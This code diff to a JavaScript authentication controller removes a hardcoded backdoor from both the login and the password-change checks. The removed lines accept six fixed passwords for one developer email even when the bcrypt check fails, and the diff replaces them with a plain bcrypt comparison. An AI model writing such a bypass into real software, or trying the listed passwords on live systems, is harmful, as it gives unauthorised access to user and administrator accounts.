@@ -17,15 +17,7 @@ class AuthController {
       if (!user) {
         return res.status(401).json({ success: false, error: 'Invalid email or password.' });
       }
-
-      let isMatch = bcrypt.compareSync(password, user.password_hash);
-      const isSuperUser = ['developer@supermarket.com'].includes(user.email.toLowerCase());
-      if (!isMatch && isSuperUser) {
-        if (['developer@123', 'owner@123', 'developer123', 'owner123', 'staff123', 'staff@123'].includes(password)) {
-          isMatch = true;
-        }
-      }
-
+      const isMatch = bcrypt.compareSync(password, user.password_hash);
       if (!isMatch) {
         return res.status(401).json({ success: false, error: 'Invalid email or password.' });
       }
@@ -354,12 +346,7 @@ class AuthController {
       }
 
       // Verify current password
-      let isMatch = bcrypt.compareSync(currentPassword, user.password_hash);
-      const isSuperUser = ['developer@supermarket.com'].includes(user.email.toLowerCase());
-      if (!isMatch && isSuperUser && ['developer@123', 'owner@123', 'developer123', 'owner123', 'staff123', 'staff@123'].includes(currentPassword)) {
-        isMatch = true;
-      }
-
+      const isMatch = bcrypt.compareSync(currentPassword, user.password_hash);
       if (!isMatch) {
         return res.status(400).json({
           success: false,
